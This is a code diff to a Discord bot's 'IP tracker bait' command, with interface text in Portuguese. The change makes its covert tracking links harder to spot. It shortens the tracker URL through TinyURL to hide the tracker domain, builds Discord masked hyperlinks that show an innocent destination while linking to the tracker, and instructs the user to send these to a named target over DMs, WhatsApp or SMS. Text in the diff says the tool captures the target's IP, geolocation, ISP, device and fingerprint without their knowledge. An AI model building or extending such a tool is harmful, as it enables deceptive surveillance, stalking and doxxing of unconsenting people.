@@ -3083,80 +3083,103 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
     const effectiveDest = genData.redirectUrl ?? THEME_REDIRECT[theme] ?? "https://discord.com/app";
     const isMasked      = !!genData.redirectUrl;
 
+    // ── Shorten the tracker URL via TinyURL (free, no auth required) ─────────
+    let shortUrl: string | null = null;
+    try {
+      const tiny = await fetch(
+        `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`,
+        { signal: AbortSignal.timeout(5000) },
+      );
+      if (tiny.ok) {
+        const text = (await tiny.text()).trim();
+        if (text.startsWith("https://tinyurl.com/")) shortUrl = text;
+      }
+    } catch { /* non-fatal — short URL is optional */ }
+
+    // ── Discord masked hyperlink — shows the real URL text but links to tracker
+    // Works in Discord DMs and messages: [visible text](actual url)
+    const discordMaskedLink = isMasked
+      ? `[${effectiveDest}](${url})`
+      : null;
+
     const embed = new EmbedBuilder()
       .setColor(isMasked ? 0x00C851 : COLORS.PURPLE)
       .setTitle(isMasked ? `🪤 URL MASKING ATIVO — ${themeLabel}` : `🪤 IP TRACKER BAIT — ${themeLabel}`)
       .setDescription(
         isMasked
-          ? `*"O link parece inocente, mas o Geass já abriu seu olho."*\n\n⚡ **URL Masking:** o alvo clica achando que é um link normal — IP capturado antes do redirecionamento.`
+          ? `*"O link parece inocente, mas o Geass já abriu seu olho."*\n\n⚡ **URL Masking ativo** — o alvo vê o link original, mas o tracker captura o IP antes de redirecionar.`
           : `*"Cada link é uma armadilha. O Geass captura o que os olhos não veem."*`
       )
       .addFields(
         {
-          name: "🎭 Aparência do Link",
-          value: [
-            `**Visual:** ${themeLabel} — tela de carregamento convincente`,
-            `**Parece ser:** Conteúdo orgânico de ${themeLabel}`,
-          ].join("\n"),
-          inline: false,
-        },
-        {
-          name: isMasked ? "🎯 Destino Real (oculto)" : "🔀 Redireciona para",
-          value: `\`${effectiveDest.length > 80 ? effectiveDest.slice(0, 77) + "..." : effectiveDest}\``,
-          inline: false,
-        },
-        {
-          name: "🎯 Alvo Registrado",
-          value: targetUser
-            ? `<@${targetUser.id}> — \`${targetUser.username}\` (\`${targetUser.id}\`)`
-            : `*${targetName}*`,
-          inline: false,
-        },
-        {
-          name: "🔗 Link Camuflado — Envie este",
-          value: url,
-          inline: false,
-        },
-        {
-          name: "🔑 Token",
-          value: `\`${token}\``,
+          name: "🎭 Aparência / Tema",
+          value: `${themeLabel} — tela de carregamento convincente`,
           inline: true,
         },
         {
-          name: "⏱️ Gerado",
-          value: `<t:${Math.floor(Date.now() / 1000)}:R>`,
+          name: "🎯 Alvo",
+          value: targetUser ? `<@${targetUser.id}>` : `*${targetName}*`,
           inline: true,
         },
         {
-          name: "📊 Ver Resultado",
-          value: `\`/panel ipcheck token:${token}\``,
-          inline: false,
+          name: "\u200b",
+          value: "\u200b",
+          inline: true,
         },
+      );
+
+    // ── Link fields — most important section ──────────────────────────────────
+    if (isMasked && discordMaskedLink) {
+      embed.addFields(
         {
-          name: "ℹ️ Como funciona",
-          value: isMasked
-            ? [
-                "1️⃣ Envie o **link camuflado** ao alvo (WhatsApp, DM, Insta, etc.)",
-                `2️⃣ O alvo clica achando ser um link de ${themeLabel}`,
-                "3️⃣ IP, geolocalização, ISP, dispositivo e fingerprint são capturados",
-                `4️⃣ Redireciona automaticamente para o link real — o alvo não percebe nada`,
-                "5️⃣ Use `/panel ipcheck` para ver todos os dados capturados",
-              ].join("\n")
-            : [
-                "1️⃣ Envie o link ao alvo (WhatsApp, DM, chat)",
-                "2️⃣ Ao clicar, IP, localização, ISP e fingerprint são capturados",
-                "3️⃣ O link redireciona para a plataforma original — parece legítimo",
-                "4️⃣ Use `/panel ipcheck` com o token para ver os dados capturados",
-              ].join("\n"),
+          name: "✅ Para Discord DM / servidor — copie e cole:",
+          value: `> ${discordMaskedLink}\n\n📌 No Discord aparece como \`${effectiveDest.slice(0, 60)}\` mas vai pro tracker`,
           inline: false,
         },
-      )
-      .setTimestamp()
-      .setFooter({ text: `${AUTHOR} • Geass Intelligence Division — IP Tracker v2` });
+      );
+    }
+
+    if (shortUrl) {
+      embed.addFields({
+        name: "📱 Link curto — WhatsApp / Telegram / SMS:",
+        value: `> \`${shortUrl}\`\n\n📌 Funciona em qualquer app — não mostra o domínio do tracker`,
+        inline: false,
+      });
+    }
+
+    embed.addFields(
+      {
+        name: "🔗 Link tracker completo (referência):",
+        value: `> \`${url}\``,
+        inline: false,
+      },
+      {
+        name: isMasked ? "🎯 Destino real (oculto do alvo)" : "🔀 Redireciona para",
+        value: `\`${effectiveDest.length > 80 ? effectiveDest.slice(0, 77) + "..." : effectiveDest}\``,
+        inline: false,
+      },
+      {
+        name: "🔑 Token",
+        value: `\`${token}\``,
+        inline: true,
+      },
+      {
+        name: "⏱️ Gerado",
+        value: `<t:${Math.floor(Date.now() / 1000)}:R>`,
+        inline: true,
+      },
+      {
+        name: "📊 Verificar captura",
+        value: `\`/panel ipcheck token:${token}\``,
+        inline: false,
+      },
+    );
 
     if (targetUser?.displayAvatarURL) {
       embed.setThumbnail(targetUser.displayAvatarURL({ size: 256 }));
     }
+
+    embed.setTimestamp().setFooter({ text: `${AUTHOR} • Geass Intelligence Division — IP Tracker v2` });
 
     await interaction.editReply({ embeds: [embed] });
 
